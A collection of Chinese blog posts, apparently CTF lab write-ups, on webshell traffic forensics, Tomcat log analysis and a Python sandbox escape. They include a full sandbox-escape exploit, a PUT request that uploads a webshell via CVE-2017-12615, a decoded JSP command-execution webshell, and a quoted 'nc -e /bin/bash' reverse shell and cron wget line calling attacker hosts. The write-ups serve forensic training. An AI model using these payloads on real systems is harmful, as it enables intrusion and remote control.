这里的break会直接跳出整个for循环，而不是continue继续检查下一行字节码，我们只要想办法触发break，那么后续所有代码的字节码都不会被检查 一开始我想通过在开头加个print(1)来触发break，但是试了一下发现返回LOAD_GLOBAL，也就是检测到了LOAD_GLOBAL但是没检测到print(1)，导致exit 开个本地调试观察分析，下个断点 发现有个LOAD_GLOBAL q，q指的是我们前面写的生成器，又因为在生成器内部尝试引用q，所以触发了LOAD_GLOBAL，但是q不是白名单里的，所以就exit了 那print呢，我们打开opcode，可以发现print不是LOAD_GLOBAL，而是LOAD_NAME 后面问AI说是版本问题，Python 3.11+是LOAD_NAME，那只能换个办法 前面我们知道生成器反汇编之后有个LOAD_GLOBAL，那我们尝试在生成器里面引用print试试，开头改为(print for _ in [1])，重新下断点调试 这次就没问题了，成功绕过source_opcode_checker限制 组合起来，完整的exp就是 12345678910111213141516(print for _ in [1])q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])globals = [*q][0]builtins = globals['_'+'_builtins_'+'_']def rewrite_print(a): q = (q.gi_frame.f_back.f_back.f_locals for _ in [1]) locals = [*q][0] if 'os' in locals: builtins.setattr(locals['os'], '_ex'+'it', print)builtins.print = rewrite_printeval = builtins.evalimp = eval('builtins._'+'_import_'+'_')system = imp(&quot;os&quot;).systemsystem(&quot;ls /&quot;) 我们写个python脚本来转换成Json数据 1234567891011121314151617181920212223import jsoncode = &quot;&quot;&quot;(print for _ in [1])q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])globals = [*q][0]builtins = globals['_'+'_builtins_'+'_']def rewrite_print(a): q = (q.gi_frame.f_back.f_back.f_locals for _ in [1]) locals = [*q][0] if 'os' in locals: builtins.setattr(locals['os'], '_ex'+'it', print)builtins.print = rewrite_printeval = builtins.evalimp = eval('builtins._'+'_import_'+'_')system = imp(&quot;os&quot;).systemsystem(&quot;ls /&quot;)&quot;&quot;&quot;json_code = json.dumps({&quot;code&quot;: code})print(json_code) 得到结果 1{&quot;code&quot;: &quot;\\n(print for _ in [1])\\nq = (q.gi_frame.f_back.f_back.f_globals for _ in [1])\\nglobals = [*q][0]\\nbuiltins = globals['_'+'_builtins_'+'_']\\n\\ndef rewrite_print(a):\\n q = (q.gi_frame.f_back.f_back.f_locals for _ in [1])\\n locals = [*q][0]\\n if 'os' in locals:\\n builtins.setattr(locals['os'], '_ex'+'it', print)\\nbuiltins.print = rewrite_print\\n\\neval = builtins.eval\\nimp = eval('builtins._'+'_import_'+'_')\\nsystem = imp(\\&quot;os\\&quot;).system\\nsystem(\\&quot;ls /\\&quot;)\\n&quot;} 放入网站执行，类型要改为application/json 成功拿到flag","link":"/posts/Python-Stack-Frame-Sandbox-Escape/"},{"title":"玄机靶场 | 冰蝎3.0-jsp流量分析","text":"冰蝎3.0流量特征 Content-TypePOST请求的 Content-Type 固定为 application/octet-stream，属于强特征 User-Agent内置了16个 User-Agent 头，通信时会随机挑选一个，但大多为老旧浏览器或罕见设备头，如果同一IP频繁变换UA且为这16个之一，可以高度怀疑是冰蝎 Accept、Cache-ControlAccept头常设为 Accept: text/html, image/gif, image/jpeg, */*; q=.2, */*; q=.2 或类似值，Cache-Control和Pragma常设为no-cache，表示直接从源服务器获取最新的响应，这些是冰蝎流量默认带的HTTP头，普通业务流量较少见 Content-Length/请求包长度因为冰蝎3.0使用AES-256加密算法，加密后的数据体积会膨胀，请求包长度一般会很大，超过正常业务范围 想要更深入了解冰蝎3.0可以参考文章：冰蝎3.0流量特征分析（附特征） 索引 题目列表步骤#1黑客IP是什么？ 先用wireshark语法筛选出http流量 快速分析一遍流量，大部分都是404，说明黑客正在进行目录扫描。拉到最后那里可以看到有个异常流量，通过PUT方法上传了indeX.jsp文件，且在请求头中伪造了多个指向本地地址的字段（如X-Forwarded-For），这种组合是典型的攻击特征，由此可判定该请求为攻击者发起的恶意文件上传行为 因此黑客IP就是192.168.31.61 1flag{192.168.31.61} 步骤#2黑客上传的Webshell名是什么？ 继续分析流量包，可以看到攻击者通过POST数据包与indeX.jsp进行通信，且响应内容为加密数据 因此webshell名就是这个文件 1flag{indeX.jsp} 步骤#3黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}） 找到刚才黑客通过PUT方法上传的文件直接查看时间即可 1flag{2025-02-22 07:47:38} 步骤#4木马的解密key是什么? 同样也是PUT方法的那个流量包，右键追踪HTTP流 可以看到黑客上传的内容，具体利用的漏洞是Tomcat通过PUT方法进行任意文件写入（CVE-2017-12615），感兴趣的可以网上了解一下 可以看到木马连接密码就在文件内容当中，长度为16字节（128位），一般用于AES对称加密 1flag{3f0af7bb4dbcfbd7} 步骤#5黑客执行的第一个命令是什么? 已知黑客是通过POST与indeX.jsp进行通信，我们修改wireshark语法搜索包含indeX.jsp的流量 1http contains &quot;indeX.jsp&quot; 然后复制请求体data内容的ASCII值，如图所示 这里用到希潭实验室的蓝队分析工具箱，下载地址：蓝队分析研判工具箱 把复制的数据和之前得到的密钥放进去解密 可能受环境影响，我这边显示有点问题，不过内容还是可以看得懂。经过分析，前面几个数据包是冰蝎用于连接用的，分析到第四个时可以看到黑客执行的命令 因此黑客执行的第一个命令是ifconfig 1flag{ifconfig} 步骤#6黑客上传的文件内容是什么? 继续分析，发现长度为362的流量记录了创建文件的命令 14ZmxhZ3s0ODUzNzViN2IwNmFkODU2YTc4OGMwZDk1MjI5ZjM1Y30= 但是解码后得到一堆乱码，那只能登进目标服务器查看对应文件内容了 题目没有给出对应的服务器账号密码，需要我们渗透进去，那我们可以仿照前面黑客PUT上传文件的方法，用抓包工具修改发包 先自己随便选一个协议，生成服务端 然后复制生成的jsp代码，粘贴到body中，同时修改请求体信息与之前黑客PUT上传的内容一样 123456789101112131415161718PUT /6.jsp/ HTTP/1.1Host: 你的玄机靶机地址:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-aliveCookie: JSESSIONID=3F426B8219ACAB91DF13B18D987842BCUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Priority: u=0, iContent-Type: application/x-www-form-urlencodedContent-Length: 782你的冰蝎jsp代码 然后发包即可，状态码显示201表示成功 在冰蝎连接webshell，根据你之前选的协议选择对应的类别即可 连接后在文件管理处，找到/home/xj/up.txt，打开文件查看内容，成功拿到flag 1flag{485375b7b06ad856a788c0d95229f35c} 步骤#7黑客下载的文件内容是什么? 继续分析流量包，分析到最后一个请求包时发现有黑客执行下载文件的命令 对应路径为/opt/apache-tomcat-8.5.19/conf/server.xml，用冰蝎查看对应文件，成功找到flag 当然也可以查看对应的响应包，同样也给出了flag 1flag{3aacab9ca36a6894c75048e4faf47052} 步骤#8服务器内的flag是什么？ 用冰蝎在服务器内找就可以，最终发现flag在/root/flag.txt里面 1flag{ae1d04dd3d15c6a18f904fe50fdf7eca}","link":"/posts/Xuanji-CTF-Behinder-3.0-Traffic-Analysis/"},{"title":"玄机靶场 | 蚁剑流量分析","text":"什么是蚁剑蚁剑（AntSword）是一款开源的网络安全工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，常用于网络渗透测试，可以远程连接被攻击的计算机，进行文件上传下载、执行系统命令等操作 蚁剑下载地址：https://github.com/AntSwordProject/antSword 蚁剑流量特征每个请求体通常以@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);开头 请求体包含base64编码内容 响应包一般是明文，但也可能存在加密情况，结果通常为随机字符和返回结果 Content-Type通常为 application/x-www-form-urlencoded，表明数据是以标准表单形式编码的 索引 玄机题目步骤#1木马的连接密码是多少 首先输入http筛选出http协议流量包，这些内容就是我们要分析的流量了 随便点开一个请求的内容，例如第一个请求包，观察发包内容 这里面的key就是木马的连接密码，为“1” 1flag{1} 步骤#2黑客执行的第一个命令是什么 点开第一个流量包，查看请求内容，选择最后一个item的value值，点击“显示分组字节流” 因为是base64编码，因此需要在左下选择Base64解码，由于蚁剑的特征，前两位是随机值，所以开始位置调整为“2”，成功得到执行命令 结合响应内容可知，第一个执行的命令为id，为什么不是cd &quot;/var/www/html&quot;呢，因为这是蚁剑自动执行的，表示攻击者是在/var/www/html执行命令的 1flag{id} 步骤#3黑客读取了哪个文件的内容，提交文件绝对路径 分析到第三个响应包时，发现返回内容为/etc/passwd 查看第三个请求包，方法跟步骤2一样，也是点开“显示分组字节流”，调整开始位置为“2”，解码为“Base64”，可以看到执行了命令cat /etc/passwd，因此答案就是这个 1flag{/etc/passwd} 步骤#4黑客上传了什么文件到服务器，提交文件名 分析到第四个响应包时，发现返回内容很短，跟其他流量包的内容差距较大，可以猜测出这是文件上传后的响应内容 跟之前一样，我们看看第四个请求包内容，解码可以得到上传的文件名 1flag{flag.txt} 步骤#5黑客上传的文件内容是什么 分析第四个请求包，可以发现编码内容跟其他流量包有较大差距，由于蚁剑上传的文件会对内容进行16进制编码，因此我们对其进行解码查看 解码选择“Hex Digits”，其他不用变，成功得到文件内容 1flag{write_flag} 步骤#6黑客下载了哪个文件，提交文件绝对路径 分析第六个响应包，可以看到这是一个文件的返回内容 通过分析，这六个HTTP事务（一次完整的请求+响应）里面，前三个是执行系统命令的，后三个则是执行文件上传下载浏览操作的 其中第四个我们已经证实是文件上传，那第五个是什么呢？通过对请求包进行解码，得到内容是/var/www/html/7，这是蚁剑自动执行的，实际上攻击者应该是点开了蚁剑的文件管理功能，然后回显为 显示的是/var/www/html里面的内容，因此第五个事务并不是下载文件，而是浏览目录 最后看第六个请求包的内容，步骤跟之前一样，得到 结合前面的返回内容，因此第六个请求包反应的就是黑客下载的文件 1flag{/var/www/html/config.php} 总结1.前三个事务反应的是执行系统命令，后三个事务反应的是文件上传下载浏览等操作，通过对前三个请求包解码可以看到 /bin/sh 是指向系统标准shell的路径，用于进行交互，也就是执行系统命令，而后三个事务没有 2.攻击者的完整行为： 12345671.攻击者首先通过蚁剑连接webshell，文件名为1.php，连接密码为1，连接URL为http://192.168.200.54/1.php2.连接后双击打开了/var/www/html目录，点开虚拟终端，执行命令id和pwd3.接着执行ls和pwd，查看当前目录文件和所在目录4.执行cat /etc/passwd和pwd，查看/etc/passwd内容和当前目录5.上传文件flag.txt到/var/www/html，内容为flag{write_flag}6.攻击者点开文件管理功能查看/var/www/html目录7.在文件管理功能处攻击者下载了/var/www/html/config.php，获得网站配置文件 通过查看config.php文件，攻击者获得了目标网站数据库的敏感信息等 参考网安日记本：https://blog.csdn.net/haosha__demingzi/article/details/135816411","link":"/posts/Xuanji-CTF-AntSword-Traffic-Analysis/"},{"title":"玄机靶场 | 第九章-blueteam 的小心思3","text":"前言题目简述：服务器有对外链接请求的痕迹，现提供一段 waf 上截获的数据包，分析对应的虚拟机环境跟数据包，找到关键字符串并且尝试修复漏洞 账号：root，密码：root123，流量包在/result.pcap 索引 题目列表步骤#1审计日志，攻击者下载恶意木马文件的 ip是多少 flag{ip} 先通过wireshark语法筛选出http流量 我们简单分析这个流量包，前面有大量的404状态码，表明黑客正在进行目录扫描。后面黑客发现了evil.php文件，但是不知道参数名是什么，对参数名进行了大量尝试，最后发现参数command可以执行命令 继续分析，可以看到黑客执行命令把shell.php下载到目标机器上 因此可知攻击者下载恶意木马文件的ip地址为192.168.150.253 1flag{192.168.150.253} 步骤#2审计流量包，木马文件连接密码是什么? flag{xxx} 继续向下分析，可以看到攻击者通过POST数据包与shell.php进行通信 因此连接密码就是cmd 1flag{cmd} 步骤#3审计流量包，攻击者反弹的IP和端口是什么? flag{ip:port} 也是刚才的流量，我们对其内容进行base64解码 发现@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);，结合前面的特征，可以推断这是通过蚁剑连接的。继续分析流量，发现有个流量记录了外连命令，通过nc反弹shell获得控制权 因此攻击者反弹的IP和端口是192.168.150.199:4444 1flag{192.168.150.199:4444} 步骤#4提交黑客上传恶意文件的 md5 md5sum xxx.so 题目提示文件后缀是.so，我们直接wireshark语法搜索内容包含.so的流量 1tcp and frame contains &quot;.so&quot; 可以看到通过redis主从复制上传了一个module.so动态链接库。前面的RESP协议是Redis 客户端和服务器之间通信使用的协议 那我们修改wireshark语法搜索RESP协议的流量 经过分析，前面上传的module.so文件有问题，加载模块后无法执行命令 后面上传了一个符合条件的module.so文件，成功执行系统命令 攻击者执行了命令nc -e /bin/bash 192.168.150.199 4444反弹shell，因此可以确定这个就是恶意文件 登录目标靶机，在根目录下计算该文件的 MD5 值即可 1md5sum module.so 1flag{d41d8cd98f00b204e9800998ecf8427e} 步骤#5攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag{http://xxxxxxxxxx/xx.xxx} 攻击者要想在服务器内维持权限，肯定是有后门的。然后题目说请求的外部地址和恶意文件的地址，那说明是会定期向外部发送请求的，我们直接查看计划任务 1cat /etc/crontab 成功发现黑客留下的后门，通过wget定期向恶意地址下载webshell到目标机器，频率为每分钟执行一次 1flag{http://192.168.150.199:88/shell.php}","link":"/posts/Xuanji-CTF-Blue-Team-Forensics-3/"},{"title":"玄机靶场 | blueteam的小心思","text":"前言玄机靶场日常刷题记录，练练手 索引 玄机题目步骤#1攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。 在根目录发现wireshark.pcap文件，可以用wireshark进行流量分析 将文件通过SFTP传到本地，过滤出http流量 一个一个分析，发现可疑流量，直接得到账号密码 md5加密得 1flag{d63edb0e9df4cf411398e3658c0237e0} 步骤#2攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。 继续往下分析，发现可疑流量 发现这里上传了一个zip压缩包，追踪TCP流 发现一句话木马，确定攻击者是通过该页面上传木马文件，加密pluginmgr.php字符得到 1flag{b05c0be368ffa72e6cb2df7e1e1b27be} 步骤#3找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。 直接查找关键字 1grep -r --include=&quot;*.php&quot; 'eval($_POST' / 加密文件得到flag 1flag{a097b773ced57bb7d51c6719fe8fe5f5} 步骤#4攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。 继续分析流量，发现可疑流量 发现这个木马文件在尝试下载一个文件，直接搜索这个文件 1find / -name &quot;is.world&quot; 这里有个坑，不能直接加密文件，要用引号括起来再加密，不然中间的空格会分隔指令 1md5sum &quot;/var/www/html/plugins/. /is.world&quot; 得到flag 1flag{ee279c39bf3dcb225093bdbafeb9a439} 步骤#5攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。 查看用户列表 1cat /etc/passwd 发现有个用户的用户ID和组ID都为0，权限很高，一般情况下只有管理员的UID和GID为0，说明这个是后门用户，直接加密得到flag 1flag{4cda3461543c9a770a3349760594facd} 步骤#6攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 一般这种情况是修改了shell配置文件，常见的配置文件包括 123456789101112用户级别1、&quot;~/.bashrc&quot; 用于配置非登录 Shell 的环境（例如桌面终端）, 每次启动新的非登录 Shell 时加载2、&quot;~/.bash_profile&quot; 用于配置 登录 Shell 的环境, 每次登录（例如通过 SSH 或控制台登录系统）3、&quot;~/.profile&quot; 用于配置 登录 Shell 环境变量, 在用户登录时执行4、&quot;~/.zshrc&quot; 每次启动 Z Shell 的非登录会话时加载5、&quot;~/.bash_logout&quot; 在用户退出登录 Shell 时执行系统级别1、&quot;/etc/profile&quot; 用于设置所有用户的登录 Shell 环境变量, 所有用户登录时加载2、&quot;/etc/bash.bashrc&quot; 提供全局的非登录 Shell 配置, 每次启动新的非登录 Shell 时加载3、&quot;/etc/profile.d/*.sh&quot; 当 /etc/profile 加载时, 会依次加载 /etc/profile.d 中的所有脚本文件（通常是 .sh 文件）4、&quot;/etc/environment&quot; 用于配置系统范围的环境变量, 在用户登录前加载，影响所有用户和守护进程 一般情况执行顺序，可以用作参考 12345678910111.登录 Shell 系统级配置文件： /etc/profile /etc/profile.d/*.sh 用户级配置文件： ~/.bash_profile（如果不存在，则加载 ~/.profile）2.非登录 Shell 系统级配置文件： /etc/bash.bashrc（如果系统支持） 用户级配置文件： ~/.bashrc 这里一个一个尝试即可，发现/etc/profile有问题 直接md5sum加密得到flag 12md5sum /etc/profile#flag{65bf3e4a9ac90d75ec28be0317775618} 步骤#7攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。 搜索后门触发命令，这里搜索的是用户目录下的可疑配置文件 1grep -r -E '(nc|curl|wget|bash|python|eval|base64)' ~/ 发现有个配置文件尝试外联恶意网址 直接加密得到flag 1flag{4acc9c465eeeb139c194893ec0a8bcbc} 步骤#8攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。 确定数据库类型 1systemctl list-units --type=service | grep -E '(mysql|mariadb|postgresql|mongodb|redis)' 查看数据库的登录信息，一般放在配置文件“config.inc.php”里面 1find / -name config.inc.php 得到数据库账号密码，用 Premium连接，一个一个尝试，发现有个数据库无法查看，说明被加密了，这里用的大佬的图 查找对应文件，可以得到文件所在路径 1find / -name JPMorgan@0020Chase 加密文件夹名得到flag 1flag{0928a5424aa6126e5923980ca103560e} 步骤#9解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。 查看mysql文件夹，发现有个可疑文件 直接抓取内容看看，发现是个加密脚本 这里要写一个逆推脚本，参考网上的文章 123456789101112131415&lt;?php $currentDate = date(&quot;Y-m-d&quot;); $key = md5('2023-11-18'); $iv = substr(hash('sha256', &quot;DeepMountainsGD&quot;), 0, 16); $filePath = &quot;/var/lib/mysql/JPMorgan@0020Chase&quot;; $files = scandir($filePath); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { $fullPath = $filePath . '/' . $file; $encryptedContent = file_get_contents($fullPath); $decryptedContent = openssl_decrypt($encryptedContent, 'aes-256-cbc', $key, 0, $iv); file_put_contents($fullPath, $decryptedContent); } } ?&gt; 这里的时间是JPMorgan@0020Chase的创建时间 1stat JPMorgan@0020Chase #查看详细信息 把脚本写进/var/www/mysql/目录 1vim 1.php 先按i插入代码，然后按一下Esc，再按住shift + :，然后输入wq保存 运行代码 1php 1.php 重启数据库 1systemctl restart mysql 这时再返回Premium，可以发现数据库解密了，Harper用户对应Areer为Chef，加密即可 1flag{8fd82b8864d71ed7fa12b59e6e34cd1c} 步骤#10因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。 这里攻击者用到提权，可以查找以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件。 1find / -user root -perm -4000 2&gt;/dev/null #4000 代表文件权限中的 SUID 位。 当一个文件被设置了 SUID 位，并且用户执行该文件时，该程序会以文件拥有者（通常是 root）的权限运行，而不是以当前用户的权限运行 发现/usr/bin/sudo，sudo 被广泛用于权限提升，估计攻击者通过这个提权，/etc/sudoers 包含了系统上 sudo 的配置和权限设置，这里抓取内容看一下 1cat /etc/sudoers www-data用户被赋予了root权限，而且不需要输入密码，到这里已经可以确认漏洞配置了，就是/etc/sudoers ，加密文件得到flag 1flag{6585817513b0ea96707ebb0d04d6aeff} 参考特别鸣谢 Peterpan.exe：https://blog.csdn.net/administratorlws/article/details/140471298","link":"/posts/Xuanji-CTF-Blue-Team-Forensics/"},{"title":"玄机靶场 | 日志分析-Tomcat日志分析","text":"前言小王在自己的服务器上安装配置了Tomcat，并写了几个简单的网页。但由于安全意识不足，很快就被攻击者利用了。请你帮他排查一下存在的安全问题 RDP 端口3389 用户名/密码：Administrator/4210bf@ 索引 题目列表步骤#1Tomcat日志所在的绝对路径是？ 首先连接目标电脑，在C盘中可以看到server目录，根据名字猜测是提供服务的 点进去可以看到tomcat目录 打开目录文件，在里面找到logs目录，然后复制路径即可 1flag{C:\\server\\apache-tomcat-11.0.5\\logs} 步骤#2攻击者对某网站进行了口令爆破。请你判断口令成功匹配的请求的响应码是？ 我们打开logs目录，可以看到里面有个日志占用空间较大 打开文件进行分析，前面是攻击者在进行目录扫描，然后后面有个关键的地方 这里攻击者访问了/demo/admin.jsp，但是由于没有凭证随后重定向到登录界面，也就是login.jsp，接着就开始对网站进行口令爆破 可以看到，在经历了大量了爆破之后也是成功登入了系统，状态码显示302，然后跳转到/demo/admin.jsp 因此判断口令成功匹配的响应码就是302 1flag{302} 步骤#3请你判断其服务器上用于盗取cookie而监听的端口是？ 题目描述：攻击者向admin.jsp的管理员留言板界面发送了恶意JS代码从而构成了存储型XSS。已知攻击者试图盗取管理员cookie，并将其发送至其本地服务器上。 题目提示攻击者向admin.jsp发送恶意代码，结合前面的日志，我们可知该文件位于/demo目录里面 里面有个messages.txt，打开后可以看到里面存储了管理员留言板接收到的信息 这个js语句就是攻击者用来窃取管理员cookie的，因此用来监听的端口就是5000 1flag{5000} 接下来我们分析一下admin.jsp中的漏洞代码，里面有个代码片段用于显示留言 12345678910&lt;h2&gt;所有留言&lt;/h2&gt;&lt;ul&gt; &lt;% if (messages != null &amp;&amp; !messages.isEmpty()) { for (String message : messages) { %&gt; &lt;li&gt;&lt;%= message %&gt;&lt;/li&gt; &lt;% } } %&gt;&lt;/ul&gt; 其中关键就是&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;，它使用了 JSP 的表达式 &lt;%= ... %&gt; 直接将从文件中读取的 message 字符串未经任何处理就输出到 HTML 页面上 攻击者提交的留言内容会原封不动地保存到messages.txt 文件里，浏览器在解析 HTML 时，会把 &lt;script&gt; 标签当作可执行代码来运行，从而触发XSS漏洞 修复建议就是对输出的 message 变量进行HTML 实体编码 修复前： 1&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt; 修复后： 123&lt;%@ page import=&quot;org.apache.commons.lang3.StringEscapeUtils&quot; %&gt;// ... &lt;li&gt;&lt;%= StringEscapeUtils.escapeHtml4(message) %&gt;&lt;/li&gt; 或者使用JSTL标签库 首先在JSP页面顶部引入JSTL核心标签库 1&lt;%@ taglib uri=&quot;http://java.sun.com/jsp/jstl/core&quot; prefix=&quot;c&quot; %&gt; 然后使用 &lt;c:out&gt; 标签来输出内容，它默认就会进行HTML编码 123&lt;c:forEach var=&quot;message&quot; items=&quot;${messages}&quot;&gt; &lt;li&gt;&lt;c:out value=&quot;${message}&quot; /&gt;&lt;/li&gt;&lt;/c:forEach&gt; 步骤#4攻击者利用执行系统命令的参数是？ 回到刚才的log日志，在最下面可以看到有个文件传递了系统命令内容 该文件原本可能是用于接收IP地址并执行网络命令的（如 ping 或 traceroute），攻击者没有输入一个正常的IP地址，而是通过命令连接符 &amp;&amp; 执行系统命令，因此参数就是ip 1flag{ip} 步骤#5攻击者通过某种手段遗留了后门文件，请你找到该文件并按需提交其文件中的flag 同样也是刚才的日志文件，看最下面那行的参数内容 1ip=8.8.8.8+%26%26+echo+%5E%3C%25%40+page+language%3D%22java%22+import%3D%22java.util.*%2Cjava.io.*%22+%25%5E%3E%5E%3C%25+String+cmd+%3D+request.getParameter%28%22cmd%22%29%3B+if+%28cmd+%21%3D+null%29+%7B+Process+p+%3D+Runtime.getRuntime%28%29.exec%28cmd%29%3B+BufferedReader+reader+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B+String+line%3B+while+%28%28line+%3D+reader.readLine%28%29%29+%21%3D+null%29+%7B+out.println%28line+%2B+%22%5E%3Cbr%5E%3E%22%29%3B+%7D+%7D+%25%5E%3E+%3E+C%3A%5Cserver%5Capache-tomcat-11.0.5%5Cwebapps%5CROOT%5Chello.jsp HTTP/1.1&quot; 200 1349 URL解码，查看原始内容 1ip=8.8.8.8 &amp;&amp; echo ^&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %^&gt;^&lt;% String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) { Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) { out.println(line + &quot;^&lt;br^&gt;&quot;); } } %^&gt; &gt; C:\\server\\apache-tomcat-11.0.5\\webapps\\ROOT\\hello.jsp HTTP/1.1&quot; 200 1349 可以看到攻击者把代码写进了C:\\server\\apache-tomcat-11.0.5\\webapps\\ROOT\\hello.jsp 我们简单分析这个后门代码 1234567891011121314151617&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %&gt;&lt;% // 从URL请求中获取名为 &quot;cmd&quot; 的参数 String cmd = request.getParameter(&quot;cmd&quot;); // 如果 &quot;cmd&quot; 参数存在 if (cmd != null) { // 在服务器上执行该参数的值作为一个系统命令 Process p = Runtime.getRuntime().exec(cmd); // 读取该命令执行后的输出结果 BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; // 将输出结果逐行打印到网页上 while ((line = reader.readLine()) != null) { out.println(line + &quot;&lt;br&gt;&quot;); } }%&gt; 文件上传后，攻击者只需要访问/hello.jsp?cmd=即可执行系统命令 我们找到这个文件，查看里面的内容 可以看到里面有个注释写了flag 1/* 疑似flag? eW91bWFkZWl0 */ 但是如果直接提交的话是不行的，需要进行base64解码后再提交 1flag{youmadeit}","link":"/posts/Xuanji-CTF-Tomcat-Log-Analysis/"},{"title":"玄机靶场 | 第五届红明谷-异常行为溯源","text":"题目描述某企业网络安全部门人员正在对企业网络资产受到的攻击行为进行溯源分析，该工作人员发现攻击者删除了一段时间内的访问日志数据，但是攻击者曾传输过已被删除的访问日志数据并且被流量监控设备捕获，工作人员对流量数据进行了初步过滤并提取出了相应数据包。已知该攻击者在开始时曾尝试低密度的攻击，发现未被相关安全人员及时发现后进行了连续多日的攻击，请协助企业排查并定位攻击者IP，flag格式为：flag{md5(IP)} 解题过程打开pcap文件分析，可以看到里面都是TCP流量，点开流量发现Data数据为Base64编码 复制ASCII文本，然后解码Base64数据，如图 可以看到解码后得到一串Json数据，里面的msg对应的内容还是Base64编码，继续解码 发现是一条日志数据，那我们的思路就是写个python脚本，遍历每一个数据包，寻找符合特定格式（以eyJ开头的Base64编码）的原始数据，再从中提取msg字段的值进行Base64解码，得到最终的日志文本 payload： 1234567891011121314151617181920212223242526272829303132333435363738394041import base64import jsonfrom scapy.all import rdpcap, RawPCAP_FILE = 'network_traffic.pcap'LOG_FILE = 'log.txt'try: print(f&quot;[*] 正在读取 {PCAP_FILE}...&quot;) packets = rdpcap(PCAP_FILE) log_count = 0 with open(LOG_FILE, 'w', encoding='utf-8') as f: for packet in packets: if packet.haslayer(Raw): try: payload = packet[Raw].load # Base64编码的JSON对象通常以'eyJ'开头 start_index = payload.find(b'eyJ') if start_index == -1: continue b64_str_1 = payload[start_index:] # 动态计算并补全缺失的'='填充 padding = b'=' * (-len(b64_str_1) % 4) json_data = json.loads(base64.b64decode(b64_str_1 + padding)) log_entry_bytes = base64.b64decode(json_data['msg']) log_entry = log_entry_bytes.decode('utf-8') f.write(log_entry.strip() + '\\n') log_count += 1 except Exception: continue print(f&quot;[+] 处理完成！共提取 {log_count} 条日志到 {LOG_FILE}&quot;)except Exception as e: print(f&quot;[!] 发生严重错误: {e}&quot;) 这个脚本用到scapy库来进行网络数据包交互与操作，可以执行命令 pip install scapy 或 sudo apt install python3-scapy 下载。然后把脚本（假设命名为decode.py）和pcap文件（network_traffic.pcap）放在同一目录，执行命令运行脚本即可 1python3 decode.py 接着直接读取文本查看哪个IP出现最多 1cat log.txt|awk '{print $1}'|sort|uniq -c|sort -r -n|head -n 10 发现35.127.46.111出现最多，MD5加密提交flag即可 1flag{475ed6d7f74f586fb265f52eb42039b6}","link":"/posts/Xuanji-CTF-Hongminggu-Forensics/"},{"title":"玄机靶场 | 哥斯拉4.0流量分析","text":"前言登录服务器并结合数据包附件来分析黑客的入侵行为，其中只有第12题需要上机，其他的用数据包附件分析即可 用户名：root 密码：xj@gsl4.0 SSH连接：ssh root@ip -p 222 注意SSH端口是222 哥斯拉流量特征哥斯拉静态特征 在默认编码情况下，jsp会出现密钥xc、密码pass和Java反射等特征 哥斯拉动态特征 User-Agent字段（弱特征）：如采用默认情况，会暴露使用的jdk信息，不过哥斯拉支持自定义HTTP头部，这个默认特征可以去除 Accept字段（弱特征）：默认是Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。，这个也可以修改，只能作为辅助手段 Cookie最后会有个分号 而正常流量如果没有分点，一般没有分号 响应数据的格式是固定的：MD5前半部分 + AES加密并Base64编码的结果 + MD5后半部分 索引 玄机题目步骤#1黑客的IP是什么？ 首先通过wireshark语法筛选出http流量并过滤掉404状态码 1http and !(http.response.code == 404) 分析流量，可以发现前面有很多GET请求，判断这是攻击者在进行目录扫描 查看IP统计进一步确认 可以看到这两个IP出现数量很多，结合前面的分析，因此192.168.31.190是攻击者IP，192.168.31.168是受害者IP 1flag{192.168.31.190} 步骤#2黑客是通过什么漏洞进入服务器的？（提交CVE编号） 继续分析流量，发现攻击者用PUT请求上传了一个文件 追踪HTTP流 出现了密钥xc、密码pass和Java反射类等，符合哥斯拉webshell特征，因此这个hello.jsp文件就是木马文件 继续分析前面的正常文件，发现网站是Tomcat搭建的 且攻击者PUT方法上传文件之后网站状态码为201 因此这是一个Tomcat的PUT文件上传漏洞，上网搜索对应漏洞即可 参考链接：https://www.cnblogs.com/Junglezt/p/18123082 